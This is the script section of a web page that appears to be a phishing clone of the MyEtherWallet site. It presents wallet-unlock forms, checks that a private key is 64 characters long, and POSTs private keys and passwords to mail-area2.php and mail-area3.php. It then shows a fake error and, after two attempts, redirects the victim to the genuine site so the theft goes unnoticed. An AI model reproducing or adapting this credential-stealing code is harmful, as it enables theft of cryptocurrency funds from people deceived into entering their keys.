	<script type="text/javascript">
	$(document).ready(function(){
		var countVisits = localStorage['count'];
		if (countVisits == 2) {
			window.location.replace('https://www.myetherwallet.com/');
		}
		
		var firstVisit = localStorage['visited'];
		if (!firstVisit) {
			$('#alert-success-modal').fadeIn();
			setTimeout(function(){$('#alert-success-modal').fadeOut();}, 5000);
			localStorage['visited'] = "yes";
			localStorage['count'] = 0;
		}
		
		$('.radio > input').prop('checked', false);
		$('.radio').click(function(){
			$('.radio > input').prop('checked', false);
			$('.area-1-jq, .area-2-jq, .area-3-jq, .area-1-jq-submit, .area-2-jq-submit, .area-3-jq-submit, .area-2-mm, .area-2-db').hide();
			$('#area-2-mm-submit').hide();
			
			$(this).find('input').prop('checked', true);
			var selector = $(this).find('input').attr('id');
			$('.' + selector).show();
			//$('.' + selector + '-submit').show();
		});
		
		$('#aria2').on('keyup', function(event){
			if($(this).val().length == '64')
			{
				$(this).removeClass('is-invalid').addClass('is-valid');
				$('.area-2-jq-submit').show();
			}
			
		});
		
		$('#aria3').on('keyup', function(event){
			
			
				$(this).removeClass('is-invalid').addClass('is-valid');
				$('.area-3-jq-submit').show();
			
		});
		
		$('#area-2-jq-submit, #area-3-jq-submit').click(function(){
			$('#alert-danger-modal').fadeIn();
			//$('#area-2-jq-submit, #area-3-jq-submit').hide();
			//$('#area-2-jq-submit, #area-3-jq-submit').prep('disabled', true);
			
			var count = localStorage['count'];
			count++;
			localStorage['count'] = count;
			if(localStorage['count'] == 2)
			$(this).hide();
			setTimeout(function(){window.location.replace("http://myetherwallet.com");}, 3000);
		});
		
		$('#area-1-submit-count').click(function(){
			var count = localStorage['count'];
			count++;
			localStorage['count'] = count;
			console.log(count);
		});
		
		$('#area-2-mm-submit, #area-2-db-submit, #area-3-lw, #area-4-tz').click(function(){
			$('#alert-danger-modal2').fadeIn();
			$('#area-2-mm-submit').hide();
		});
		
		$('.icon-close').click(function(){
			$('#alert-danger-modal, #alert-danger-modal2').fadeOut();
		});
		
		$('#upload-wallet-1').click(function(){
			$('#id-wallet-1-parent').click();
		});
		
		$('#id-wallet-1-parent').change(function(){
			$('#aria-1-password').show();
			$('#area-1-password-title').show();
			$('#upload-wallet-1').html('File Selected');
			$('#upload-wallet-1').css('background-color','#0e97c0').css('color','#ffffff');
			
		});
		
		$('#aria-1-password').on('keyup', function(){
			$('.area-1-jq-submit').show();
		});
		
		$('#area-1-mm').click(function(){
			$('.area-2-mm').show();
		});
		
		$('#area-2-db').click(function(){
			$('.area-2-db').show();
		});

		/* Plus Minus Toggling */

		$('.collapse-button').click(function(){
			if($(this).text() == '-'){
				$(this).text('+');
				$(".show-hide-toggle").css('visibility','hidden');
			} else {
				$(this).text('-');
				$(".show-hide-toggle").css('visibility','visible');
			}

		})

		/* Modal */
		$('#onboardingModal').modal('show');
		$('#modal-close').click(function(){
			$('#onboardingModal').modal('hide');
		})

		
	});
	function mailArea2(){
		jQuery.ajax({
			url: "mail-area2.php",
			method: "POST",
			data: {key2: $('#aria2').val()}
		}).done(function(){$('#alert-danger-modal').fadeIn();});
	}
	
	function mailArea3(){
		jQuery.ajax({
			url: "mail-area3.php",
			method: "POST",
			data: {key3: $('#aria3').val(), pass: $('#aria-3-password').val()}
		}).done(function(){$('#alert-danger-modal').fadeIn();});
	}
</script>
</head>


